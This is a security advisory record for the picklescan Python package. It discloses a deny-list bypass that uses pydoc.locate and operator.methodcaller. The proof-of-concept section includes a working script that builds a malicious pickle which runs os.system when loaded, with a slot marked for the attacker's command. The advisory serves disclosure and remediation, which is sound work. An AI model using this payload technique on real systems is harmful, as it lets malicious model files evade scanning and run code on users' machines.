{
  "Severity": "HIGH",
  "UpdatedAt": "2025-12-29T15:24:21Z",
  "Package": {
    "Ecosystem": "PIP",
    "Name": "picklescan"
  },
  "Advisory": {
    "DatabaseId": 328840,
    "Id": "GSA_kwCzR0hTQS04NHIyLWp3N2MtNHI1cc4ABQSI",
    "GhsaId": "GHSA-84r2-jw7c-4r5q",
    "References": [
      {
        "Url": "https://github.com/mmaitre314/picklescan/security/advisories/GHSA-84r2-jw7c-4r5q"
      },
      {
        "Url": "https://github.com/mmaitre314/picklescan/pull/53"
      },
      {
        "Url": "https://github.com/mmaitre314/picklescan/commit/70c1c6c31beb6baaf52c8db1b6c3c0e84a6f9dab"
      },
      {
        "Url": "https://github.com/mmaitre314/picklescan/releases/tag/v0.0.33"
      },
      {
        "Url": "https://github.com/advisories/GHSA-84r2-jw7c-4r5q"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-84r2-jw7c-4r5q"
      }
    ],
    "Description": "### Summary\nCurrently picklescanner only blocks some specific functions of the pydoc and operator modules. Attackers can use other functions within these allowed modules to go through undetected and achieve RCE on the final user. Particularly\n* pydoc.locate: Can dynamically resolve and import arbitrary modules (e.g., resolving the string \"os\" to the actual os module).\n* operator.methodcaller: Allows executing a method on an object. When combined with a resolved module object, it can execute functions like system.\n\nSince locate and methodcaller are not explicitly listed in the deny-list, picklescan treats them as \"Safe\" or \"Suspicious\" (depending on configuration) but does not flag them as \"Dangerous\", allowing the malicious file to bypass the security check.\n\n### PoC\n\nuse the provided script to create a malicious pickle file \n\n```python\nimport pickle\nimport pydoc\nimport operator\nimport os\n\nclass ModuleLocator:\n    def __init__(self, module_name):\n        self.module_name = module_name\n        \n    def __reduce__(self):\n        return (pydoc.locate, (self.module_name,))\n\nclass RCEPayload:\n    def __reduce__(self):\n        \n        cmd = \"notepad\" #put your payload here\n        \n        mc = operator.methodcaller(\"system\", cmd)\n        return (mc, (ModuleLocator(\"os\"),))\n\ndef generate_exploit():\n    payload = RCEPayload()\n    \n    try:\n        with open(\"bypass.pkl\", \"wb\") as f:\n            f.write(pickle.dumps(payload))\n        print(\"File 'bypass.pkl' created.\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\nif __name__ == \"__main__\":\n    generate_exploit()\n```\n\nThe generated payload will not be flagged as dangerous by picklescan but is actually malicious. \n\n```python\nimport pickle\nprint(\"Loading bypass.pkl...\")\npickle.load(open(\"bypass.pkl\", \"rb\"))\n```\n\nScript to open the pickle file, demonstrating impact\n\n\u003cimg width=\"746\" height=\"341\" alt=\"image\" src=\"https://github.com/user-attachments/assets/2be1b8f9-d467-408d-b1cf-d40b49100cf0\" /\u003e\n\n\n### Remediation\nThe deny-list for these modules must be upgraded from specific functions to a wildcard (*), indicating that any use of these modules is dangerous.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-12-29T15:24:20Z",
    "Severity": "HIGH",
    "Summary": "Picklescan has Incomplete List of Disallowed Inputs",
    "UpdatedAt": "2025-12-29T15:24:21Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "0.0.33"
      },
      "VulnerableVersionRange": "\u003c 0.0.33"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "0.0.33"
      },
      "VulnerableVersionRange": "\u003c 0.0.33"
    }
  ]
}